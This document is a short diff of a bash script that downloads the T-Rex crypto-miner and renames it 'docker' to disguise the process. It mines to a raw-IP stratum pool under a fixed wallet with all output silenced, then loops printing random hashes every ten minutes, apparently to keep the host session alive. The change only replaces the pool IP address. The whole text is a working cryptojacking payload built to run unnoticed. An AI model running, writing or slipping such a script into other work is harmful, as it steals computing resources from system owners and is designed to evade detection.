@@ -1,5 +1,5 @@
 #!/bin/bash
 wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz && tar -xvf t-rex-0.26.8-linux.tar.gz >/dev/null 2>&1
 mv t-rex docker
-./docker -a firopow -o stratum+tcp://45.56.78.249:80 -u a3DjekpLyFXTUCi8mRNWv2kBfkA51cwRbw.$(echo $(shuf -i 1000-9999 -n 1)-RABBIT) -p x >/dev/null 2>&1
+./docker -a firopow -o stratum+tcp://139.144.169.209:80 -u a3DjekpLyFXTUCi8mRNWv2kBfkA51cwRbw.$(echo $(shuf -i 1000-9999 -n 1)-RABBIT) -p x >/dev/null 2>&1
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
